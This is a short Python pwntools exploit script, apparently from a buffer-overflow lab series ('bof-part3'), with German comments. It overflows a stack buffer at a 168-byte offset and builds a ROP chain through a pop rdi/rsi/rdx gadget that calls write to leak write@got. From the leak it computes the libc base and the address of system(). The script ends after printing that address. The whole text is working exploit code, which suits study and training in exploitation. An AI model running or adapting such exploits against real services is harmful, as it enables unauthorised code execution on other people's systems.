#!/usr/bin/env python
from pwn import *

pop3ret    = 0x40116a                # Unser pop rdi; pop rsi; pop rdx; ret; gadget gadget
write_off  = 0x0f7af0
system_off = 0x04c920
bin=ELF("./bof-part3")

s=remote("127.0.0.1",2323)
s.recvuntil(b": ")

buf = b"A"*168                        # RIP offset
buf += p64(pop3ret)                   # POP Argumente
buf += p64(constants.STDOUT_FILENO)   # stdout
buf += p64(bin.got[b'write'])         # lese von write@got
buf += p64(0x8)                       # schreibe 8 bytes in stdout
buf += p64(bin.plt[b'write'])         # Rückkehr nach write@plt
buf += b'EOPAY'                       # Ende des Payloads

print("[+] send payload")
s.send(buf)           
s.recvuntil(b'EOPAY')
print("[+] recvd \'EOPAY\'")

got_leak=u64(s.recv(8))
print("[+] leaked write address: {}".format(hex(got_leak)))

libc_base = got_leak - write_off     # Berechne libc Basis
print("[+] libc base is at", hex(libc_base) )

system_addr = libc_base + system_off # Berechne system Adresse

print("[+] system() is at", hex(system_addr) )